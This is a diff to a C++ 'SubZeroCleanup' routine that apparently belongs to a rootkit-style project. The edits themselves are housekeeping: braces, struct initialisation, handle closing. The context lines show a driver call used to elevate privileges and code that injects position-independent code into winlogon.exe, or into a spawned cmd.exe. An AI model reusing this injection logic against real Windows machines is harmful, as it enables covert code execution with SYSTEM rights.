@@ -51,7 +51,9 @@ void SubZeroCleanup::Cleanup()
                     nullptr, 0,							// output buffer
                     &bytesReturned,                  			// # bytes returned
                     nullptr))
+                {
                     throw std::runtime_error("[-] DeviceIoControl Failed");
+                }
 
             	// Current process now will bw able to inject the PIC to winlogon.exe
                 picTargetPID = GetProcessPidByProcessName(L"winlogon.exe");
@@ -86,9 +88,13 @@ void SubZeroCleanup::Cleanup()
 	// If there was an error elevating explorer to SYSTEM
 	if (0 == picTargetPID)
     {
-		STARTUPINFO si = { 0 };
-		PROCESS_INFORMATION pi = { 0 };
-    	
+		STARTUPINFO si;
+		PROCESS_INFORMATION pi;
+
+        ::ZeroMemory(&si, sizeof(si));
+        si.cb = sizeof(si);
+        ::ZeroMemory(&pi, sizeof(pi));
+		
 		// Creates a child cmd process that will be the PIC target
 		if (!::CreateProcessW(
             L"C:\\Windows\\system32\\cmd.exe",          // Module
@@ -106,6 +112,9 @@ void SubZeroCleanup::Cleanup()
             throw std::runtime_error(finalException.str());
 		}
 
+        ::CloseHandle(pi.hProcess);
+        ::CloseHandle(pi.hThread);
+		
         picTargetPID = pi.dwProcessId;
     }
 
@@ -114,7 +123,7 @@ void SubZeroCleanup::Cleanup()
     {
         LoadLibraryA,
     	GetProcAddress,
-        ::GetCurrentProcessId()
+        static_cast<int>(::GetCurrentProcessId())
     };
 
     if (nullptr == picParams.getProcAddress || nullptr == picParams.loadLibraryA)
@@ -145,10 +154,8 @@ std::uint32_t SubZeroCleanup::GetProcessPidByProcessName(const std::wstring& pro
     {
         std::wstring currentProcessName(process.szExeFile);
 
-        if (processName == currentProcessName)
-        {
+        if (processName == currentProcessName)        
             return process.th32ProcessID;
-        }
     }
 
     throw std::runtime_error("Could not find target process PID");
